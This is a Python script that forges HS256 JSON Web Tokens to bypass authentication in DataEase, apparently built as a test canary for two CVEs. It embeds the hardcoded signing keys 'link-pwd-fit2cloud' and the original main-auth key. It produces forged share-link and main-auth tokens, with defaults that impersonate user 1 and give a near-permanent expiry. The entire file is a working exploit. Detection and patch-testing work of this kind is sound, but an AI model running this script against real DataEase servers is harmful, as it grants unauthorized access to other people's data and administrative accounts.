#!/usr/bin/env python3
"""Standalone HS256 JWT forger (no external deps) for the DataEase auth-bypass canary.

Mirrors DataEase's com.auth0 JWT.create() token shape:
  header  = {"typ":"JWT","alg":"HS256"}
  payload = {"uid":<long>, "resourceId":<long>, "oid":<long>, "exp":<epoch-seconds>}
signed with HMAC-SHA256 over base64url(header)."+"base64url(payload) using the given key.

Used to forge BOTH:
  - the ShareLink linkToken (X-DE-LINK-TOKEN) signed with the residual hardcoded
    key 'link-pwd-fit2cloud'  (CVE-2026-57172), and
  - the main-auth token (X-DE-TOKEN) signed with the original hardcoded key
    '83d923c9f1d8fcaa46cae0ed2aaa81b5' (CVE-2024-52295).
"""
import base64, hashlib, hmac, json, sys, time


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def forge(key: str, claims: dict) -> str:
    header = {"typ": "JWT", "alg": "HS256"}
    seg = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(key.encode(), seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64url(sig)


def link_token(key: str, uid: int, resource_id: int, oid: int, ttl: int = 86400) -> str:
    return forge(key, {"uid": uid, "resourceId": resource_id, "oid": oid,
                       "exp": int(time.time()) + ttl})


def main_token(key: str, uid: int, oid: int, ttl: int = 10 ** 9) -> str:
    return forge(key, {"uid": uid, "oid": oid, "exp": int(time.time()) + ttl})


if __name__ == "__main__":
    kind = sys.argv[1] if len(sys.argv) > 1 else "link"
    if kind == "link":
        key = sys.argv[2] if len(sys.argv) > 2 else "link-pwd-fit2cloud"
        uid = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        rid = int(sys.argv[4]) if len(sys.argv) > 4 else 777000777
        oid = int(sys.argv[5]) if len(sys.argv) > 5 else 1
        print(link_token(key, uid, rid, oid))
    else:
        key = sys.argv[2] if len(sys.argv) > 2 else "83d923c9f1d8fcaa46cae0ed2aaa81b5"
        uid = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        oid = int(sys.argv[4]) if len(sys.argv) > 4 else 1
        print(main_token(key, uid, oid))
